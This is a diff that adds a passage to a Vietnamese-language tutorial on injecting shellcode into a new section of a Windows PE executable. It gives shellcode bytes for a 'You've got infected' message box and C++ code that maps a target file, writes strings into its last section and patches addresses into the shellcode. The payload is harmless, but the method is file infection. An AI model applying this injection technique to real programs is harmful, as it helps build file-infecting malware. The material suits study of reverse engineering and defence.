@@ -216,4 +216,105 @@ BOOL AddSection(const char* filename) {
 
 ## Add Code Into New Section
 
+Theo nội dung của Section mới, ta thấy được đoạn shellcode như sau:
 
+```shellcode
+0x6A 0x00                        (PUSH 0)
+0x68 0x30 0xF0 0x01 0x00         (PUSH 0x101F030)
+0x68 0x50 0xF0 0x01 0x00         (PUSH 0x101F030)
+0x6A 0x00                        (PUSH 0)
+0xE8 0x2D 0xBE 0x88 0x75         (CALL 0x7588BE2D)
+0xE9 0x5D 0x34 0xFF 0xFF         (JMP 0x1012475)
+```
+
+Tuy nhiên khi code ta cần phải tính toán lại địa chỉ để code có thể hoạt động trên các file khác nhau vì thế đoạn shellcode chung sẽ như sau:
+
+```Cpp
+char shellCode[] = 
+    "\x6A\x00"                  // PUSH 0
+    "\x68\x00\x00\x00\x00"      // PUSH "Injected Calculator"
+    "\x68\x00\x00\x00\x00"      // PUSH "You've got infected"
+    "\x6A\x00"                  // PUSH 0
+    "\xE8\x00\x00\x00\x00"      // CALL USER32.MessageBoxA
+    "\xE9\x00\x00\x00\x00";     // JMP 1012475
+```
+
+Đầu tiên ta cần đưa 2 đoạn string mà ta cần vào trong section tại một địa chỉ nhất định
+
+```
+HANDLE hFile;
+HANDLE hFileMapping;
+LPVOID lpFileBase;
+PIMAGE_DOS_HEADER dosHeader;
+PIMAGE_NT_HEADERS ntHeaders;
+PIMAGE_SECTION_HEADER sectionHeader;
+
+// Open the file
+hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+if (hFile == INVALID_HANDLE_VALUE) {
+    printf("Could not open file (error %lu)\n", GetLastError());
+    return FALSE;
+}
+
+// Create a file mapping object
+hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
+if (!hFileMapping) {
+    printf("Could not create file mapping object (error %lu)\n", GetLastError());
+    CloseHandle(hFile);
+    return FALSE;
+}
+
+// Map the file into the address space of the current process
+lpFileBase = MapViewOfFile(hFileMapping, FILE_MAP_WRITE, 0, 0, 0);
+if (!lpFileBase) {
+    printf("Could not map view of file (error %lu)\n", GetLastError());
+    CloseHandle(hFileMapping);
+    CloseHandle(hFile);
+    return FALSE;
+}
+
+// Get the DOS header of the file
+dosHeader = (PIMAGE_DOS_HEADER)lpFileBase;
+if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+    printf("Invalid DOS signature\n");
+    UnmapViewOfFile(lpFileBase);
+    CloseHandle(hFileMapping);
+    CloseHandle(hFile);
+    return FALSE;
+}
+
+// Get the NT headers
+ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpFileBase + dosHeader->e_lfanew);
+if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+    printf("Invalid NT signature\n");
+    UnmapViewOfFile(lpFileBase);
+    CloseHandle(hFileMapping);
+    CloseHandle(hFile);
+    return FALSE;
+}
+
+// Get the last section header
+sectionHeader = IMAGE_FIRST_SECTION(ntHeaders) + (ntHeaders->FileHeader.NumberOfSections - 1);
+
+char shellCode[] = 
+    "\x6A\x00"                  // PUSH 0
+    "\x68\x00\x00\x00\x00"      // PUSH "Injected Calculator"
+    "\x68\x00\x00\x00\x00"      // PUSH "You've got infected"
+    "\x6A\x00"                  // PUSH 0
+    "\xE8\x00\x00\x00\x00"      // CALL USER32.MessageBoxA
+    "\xE9\x00\x00\x00\x00";     // JMP 1012475
+
+// Calculate the offset and size for the new data with added the section
+const char* titleStr = "Code Injector";
+DWORD titleOffset = 0x30;
+const char* captionStr = "You've got infected";
+DWORD captionOffset = 0x50;
+
+// Append the strings into section (+1 at strlen() since both strings are null-terminated strings)
+memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData + titleOffset, titleStr, strlen(titleStr) + 1);
+memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData + captionOffset, captionStr, strlen(captionStr) + 1);
+
+// Edit shellcode with 2 added strings
+*(DWORD*)(shellCode + 3) = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + titleOffset;
+*(DWORD*)(shellCode + 8) = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + captionOffset;
+```
